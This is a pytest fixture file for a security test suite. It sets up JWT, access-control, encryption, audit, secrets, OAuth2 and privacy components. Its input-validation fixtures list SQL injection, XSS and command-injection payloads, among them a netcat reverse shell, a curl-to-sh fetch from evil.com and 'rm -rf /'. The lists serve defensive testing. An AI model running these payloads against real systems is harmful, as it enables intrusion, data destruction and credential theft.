"""Shared fixtures for GRC_Claw security test suite.

This conftest provides reusable fixtures for testing authentication,
authorization, encryption, audit, input validation, rate limiting,
secrets management, API security, and data privacy across the
GRC_Claw security layer.
"""

from __future__ import annotations

import hashlib
import hmac
import json
import secrets
import sys
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, Generator, List, Optional, Set, Tuple
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# Path setup — ensure security package is importable
# ---------------------------------------------------------------------------

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
SECURITY_ROOT = REPO_ROOT / "security"

for _path in (str(REPO_ROOT), str(SECURITY_ROOT)):
    if _path not in sys.path:
        sys.path.insert(0, _path)


# ---------------------------------------------------------------------------
# Generic fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(scope="session")
def repo_root() -> Path:
    """Return the repository root directory."""
    return REPO_ROOT


@pytest.fixture(scope="session")
def security_root() -> Path:
    """Return the security package root directory."""
    return SECURITY_ROOT


@pytest.fixture
def sample_user_id() -> str:
    """Return a sample user identifier."""
    return f"user-{uuid.uuid4().hex[:12]}"


@pytest.fixture
def sample_session_id() -> str:
    """Return a sample session identifier."""
    return f"sess-{uuid.uuid4().hex[:16]}"


@pytest.fixture
def sample_timestamp() -> float:
    """Return a fixed timestamp for deterministic tests."""
    return 1_700_000_000.0


@pytest.fixture
def sample_ip_address() -> str:
    """Return a sample IP address."""
    return "192.168.1.100"


@pytest.fixture
def sample_user_agent() -> str:
    """Return a sample user agent string."""
    return "GRC-Claw-Test/1.0"


# ---------------------------------------------------------------------------
# JWT fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def jwt_key_store() -> Any:
    """Return an HMACKeyStore with a generated key."""
    from auth.jwt import HMACKeyStore

    store = HMACKeyStore()
    store.generate_key(key_id="test-key-1")
    return store


@pytest.fixture
def jwt_manager(jwt_key_store: Any) -> Any:
    """Return a JWTManager configured for testing."""
    from auth.jwt import JWTManager

    return JWTManager(
        key_store=jwt_key_store,
        default_algorithm="HS256",
        issuer="https://test.grc-claw.local",
        audience="test-api",
        clock_skew=0,
    )


@pytest.fixture
def jwt_token(jwt_manager: Any, sample_user_id: str) -> str:
    """Return a valid JWT token for the sample user."""
    return jwt_manager.create_token(
        subject=sample_user_id,
        claims={"role": "admin", "email": "admin@test.local"},
        expires_in=3600,
    )


@pytest.fixture
def expired_jwt_token(jwt_manager: Any, sample_user_id: str) -> str:
    """Return an expired JWT token."""
    return jwt_manager.create_token(
        subject=sample_user_id,
        claims={"role": "admin"},
        expires_in=-10,  # Already expired
    )


@pytest.fixture
def jwt_revocation_store() -> Any:
    """Return a JWT revocation store."""
    from auth.jwt import JWTRevocationStore

    return JWTRevocationStore()


# ---------------------------------------------------------------------------
# RBAC / PBAC fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def role_registry() -> Any:
    """Return a RoleRegistry with standard test roles."""
    from auth.rbac import Role, RoleRegistry

    registry = RoleRegistry()
    registry.register_role(
        Role(
            name="admin",
            description="Full system access",
            permissions=frozenset({"*"}),
        )
    )
    registry.register_role(
        Role(
            name="editor",
            description="Content editing access",
            permissions=frozenset({"read:content", "write:content", "delete:content"}),
        )
    )
    registry.register_role(
        Role(
            name="viewer",
            description="Read-only access",
            permissions=frozenset({"read:content"}),
        )
    )
    registry.register_role(
        Role(
            name="super_admin",
            description="Inherits admin with extra permissions",
            permissions=frozenset({"manage:users", "manage:system"}),
            parent_roles=frozenset({"admin"}),
        )
    )
    return registry


@pytest.fixture
def rbac_engine(role_registry: Any) -> Any:
    """Return an RBACEngine with test users."""
    from auth.rbac import RBACEngine

    engine = RBACEngine(role_registry)
    engine.assign_role("user-admin", "admin")
    engine.assign_role("user-editor", "editor")
    engine.assign_role("user-viewer", "viewer")
    engine.assign_role("user-super", "super_admin")
    return engine


@pytest.fixture
def pbac_engine() -> Any:
    """Return a PBACEngine with test policies."""
    from auth.rbac import AccessDecision, Effect, PBACEngine, Policy

    engine = PBACEngine()
    engine.add_policy(
        Policy(
            name="allow-all-read",
            description="Allow all read operations",
            effect=Effect.ALLOW,
            subjects=frozenset({"*"}),
            actions=frozenset({"read:*"}),
            resources=frozenset({"*"}),
            priority=10,
        )
    )
    engine.add_policy(
        Policy(
            name="deny-deletes",
            description="Deny all delete operations",
            effect=Effect.DENY,
            subjects=frozenset({"*"}),
            actions=frozenset({"delete:*"}),
            resources=frozenset({"*"}),
            priority=100,
        )
    )
    return engine


@pytest.fixture
def hybrid_engine(rbac_engine: Any, pbac_engine: Any) -> Any:
    """Return a HybridAccessEngine combining RBAC and PBAC."""
    from auth.rbac import HybridAccessEngine

    return HybridAccessEngine(rbac_engine, pbac_engine)


# ---------------------------------------------------------------------------
# Encryption fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def aes_key() -> bytes:
    """Return a 256-bit AES key."""
    return secrets.token_bytes(32)


@pytest.fixture
def aes_cipher(aes_key: bytes) -> Any:
    """Return an AES256GCM cipher instance."""
    from encryption.aes import AES256GCM

    return AES256GCM(aes_key)


@pytest.fixture
def envelope_encryption(aes_key: bytes) -> Any:
    """Return an EnvelopeEncryption instance."""
    from encryption.aes import EnvelopeEncryption

    return EnvelopeEncryption(aes_key)


@pytest.fixture
def field_level_encryption(aes_key: bytes) -> Any:
    """Return a FieldLevelEncryption instance."""
    from encryption.aes import FieldLevelEncryption

    return FieldLevelEncryption(aes_key)


# ---------------------------------------------------------------------------
# Audit fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def audit_event() -> Any:
    """Return a sample audit event."""
    from audit.events import (
        Action,
        Actor,
        AuditEvent,
        AuditEventType,
        AuditOutcome,
        AuditSeverity,
        Context,
        Resource,
    )

    return AuditEvent(
        type=AuditEventType.AUTHENTICATION,
        severity=AuditSeverity.INFO,
        outcome=AuditOutcome.SUCCESS,
        actor=Actor(
            id="user-123",
            type="user",
            name="Test User",
            ip_address="192.168.1.100",
        ),
        resource=Resource(
            id="resource-456",
            type="api_endpoint",
            name="/api/v1/data",
        ),
        action=Action(
            name="login",
            type="authentication",
            parameters={"method": "password"},
            result="success",
        ),
        context=Context(
            request_id=str(uuid.uuid4()),
            environment="testing",
            service="test-service",
        ),
        message="User logged in successfully",
        tags=["auth", "test"],
    )


@pytest.fixture
def hash_chain() -> Any:
    """Return a HashChain instance."""
    from audit.hashchain import HashChain

    return HashChain(chain_id="test-chain-001")


@pytest.fixture
def hash_chain_with_events(hash_chain: Any, audit_event: Any) -> Any:
    """Return a HashChain pre-populated with events."""
    for i in range(5):
        from audit.events import AuditEvent, AuditEventType

        event = AuditEvent(
            type=AuditEventType.SYSTEM_EVENT,
            message=f"Test event {i}",
        )
        hash_chain.append(event)
    return hash_chain


# ---------------------------------------------------------------------------
# Secrets management fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def secret_store() -> Any:
    """Return an InMemorySecretStore."""
    from secrets.management import InMemorySecretStore

    return InMemorySecretStore()


@pytest.fixture
def sample_secret() -> Any:
    """Return a sample secret."""
    from secrets.management import Secret, SecretMetadata, SecretType

    now = time.time()
    return Secret(
        metadata=SecretMetadata(
            id="secret-001",
            name="test-api-key",
            type=SecretType.API_KEY,
            created_at=now,
            updated_at=now,
            expires_at=now + 86400 * 30,
            version=1,
        ),
        value="test-secret-value-abc123",
    )


@pytest.fixture
def rotation_policy() -> Any:
    """Return a sample rotation policy."""
    from secrets.management import RotationPolicy, RotationStrategy, SecretType

    return RotationPolicy(
        name="test-rotation-policy",
        secret_type=SecretType.API_KEY,
        interval_seconds=86400 * 7,  # 7 days
        strategy=RotationStrategy.AUTOMATIC,
        auto_rotate=True,
        max_versions=3,
    )


# ---------------------------------------------------------------------------
# OAuth2 fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def oauth2_config() -> Any:
    """Return a sample OIDC configuration."""
    from auth.oauth2 import OIDCConfiguration

    return OIDCConfiguration(
        issuer="https://auth.test.local",
        authorization_endpoint="https://auth.test.local/authorize",
        token_endpoint="https://auth.test.local/token",
        userinfo_endpoint="https://auth.test.local/userinfo",
        jwks_uri="https://auth.test.local/jwks",
        end_session_endpoint="https://auth.test.local/logout",
        introspection_endpoint="https://auth.test.local/introspect",
        scopes_supported=["openid", "profile", "email"],
        response_types_supported=["code"],
        grant_types_supported=["authorization_code", "refresh_token"],
    )


@pytest.fixture
def pkce_pair() -> Any:
    """Return a PKCE pair for testing."""
    from auth.oauth2 import generate_pkce_pair

    return generate_pkce_pair()


# ---------------------------------------------------------------------------
# SPIFFE fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def spiffe_id() -> Any:
    """Return a sample SPIFFE ID."""
    from auth.spiffe import SPIFFEIDParser

    return SPIFFEIDParser.parse("spiffe://test.local/ns/default/sa/test-sa")


@pytest.fixture
def spiffe_validator() -> Any:
    """Return a SVIDValidator for the test trust domain."""
    from auth.spiffe import SVIDValidator

    return SVIDValidator(trust_domain="test.local")


# ---------------------------------------------------------------------------
# Rate limiting fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def rate_limit_condition() -> Any:
    """Return a rate limit condition: 5 requests per 60 seconds."""
    from auth.rbac import rate_limit_condition

    return rate_limit_condition(max_requests=5, window_seconds=60)


# ---------------------------------------------------------------------------
# Input validation fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def sql_injection_payloads() -> List[str]:
    """Return common SQL injection payloads for testing."""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM users--",
        "' OR 1=1--",
        "admin'--",
        "' OR '1'='1' /*",
        "1 AND 1=1",
        "'; EXEC xp_cmdshell('dir'); --",
    ]


@pytest.fixture
def xss_payloads() -> List[str]:
    """Return common XSS payloads for testing."""
    return [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<body onload=alert('xss')>",
        "<iframe src='javascript:alert(1)'>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    ]


@pytest.fixture
def command_injection_payloads() -> List[str]:
    """Return common command injection payloads for testing."""
    return [
        "; cat /etc/passwd",
        "| whoami",
        "$(rm -rf /)",
        "`id`",
        "; nc -e /bin/sh 10.0.0.1 4444",
        "&& curl http://evil.com/shell.sh | sh",
    ]


# ---------------------------------------------------------------------------
# API security fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def security_headers() -> Dict[str, str]:
    """Return expected security headers for API responses."""
    return {
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "DENY",
        "X-XSS-Protection": "1; mode=block",
        "Content-Security-Policy": "default-src 'self'",
        "Referrer-Policy": "strict-origin-when-cross-origin",
        "Permissions-Policy": "geolocation=(), microphone=(), camera=()",
        "Cache-Control": "no-store, no-cache, must-revalidate",
        "Pragma": "no-cache",
    }


@pytest.fixture
def cors_config() -> Dict[str, Any]:
    """Return a sample CORS configuration."""
    return {
        "allow_origins": ["https://app.test.local"],
        "allow_methods": ["GET", "POST", "PUT", "DELETE"],
        "allow_headers": ["Content-Type", "Authorization"],
        "allow_credentials": True,
        "max_age": 3600,
    }


# ---------------------------------------------------------------------------
# Data privacy fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def pii_fields() -> Set[str]:
    """Return a set of PII field names."""
    return {
        "email",
        "phone",
        "ssn",
        "credit_card",
        "address",
        "date_of_birth",
        "first_name",
        "last_name",
    }


@pytest.fixture
def sample_pii_data() -> Dict[str, Any]:
    """Return sample data containing PII fields."""
    return {
        "id": "user-123",
        "email": "john.doe@example.com",
        "phone": "+1-555-123-4567",
        "ssn": "123-45-6789",
        "credit_card": "4111-1111-1111-1111",
        "address": "123 Main St, Anytown, USA",
        "date_of_birth": "1990-01-15",
        "first_name": "John",
        "last_name": "Doe",
        "non_sensitive": "public data",
    }


# ---------------------------------------------------------------------------
# Mock HTTP client fixture
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_http_client() -> MagicMock:
    """Return a mock HTTP client for testing."""
    client = MagicMock()
    client.get = AsyncMock()
    client.post = AsyncMock()
    client.put = AsyncMock()
    client.delete = AsyncMock()
    client.request = AsyncMock()
    return client


# ---------------------------------------------------------------------------
# Token binding fixture
# ---------------------------------------------------------------------------


@pytest.fixture
def token_binding() -> Any:
    """Return a TokenBinding instance."""
    from auth.jwt import TokenBinding

    return TokenBinding()
